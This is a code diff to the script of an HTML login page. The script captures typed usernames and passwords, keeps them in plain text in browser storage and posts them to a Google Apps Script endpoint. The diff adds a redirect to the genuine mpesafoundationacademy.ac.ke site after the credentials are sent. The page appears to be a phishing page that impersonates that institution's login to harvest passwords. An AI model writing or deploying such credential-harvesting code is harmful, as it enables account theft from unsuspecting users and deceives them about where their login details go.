@@ -136,19 +136,21 @@
     e.preventDefault();
     const user = document.getElementById("username").value.trim();
     const pass = document.getElementById("password").value.trim();
+
     if (!user || !pass) {
       alert("Please enter both username and password.");
       return;
     }
+
     const attempts = JSON.parse(localStorage.getItem("loginAttempts")) || [];
     attempts.push({ username: user, password: pass, time: new Date().toLocaleString() });
     localStorage.setItem("loginAttempts", JSON.stringify(attempts));
-    
+
     const formData = new FormData();
     formData.append("username", user);
     formData.append("password", pass);
     formData.append("role", "participant");
-    
+
     try {
       const response = await fetch(GOOGLE_SCRIPT_URL, {
         method: "POST",
@@ -159,7 +161,8 @@
         }
       });
       if (response.ok) {
-        
+        // Redirect immediately after successful submission
+        window.location.href = "https://mpesafoundationacademy.ac.ke/";
       } else {
         alert("Failed to submit credentials. Please try again.");
       }
@@ -171,4 +174,3 @@
 </script>
 </body>
 </html>
-
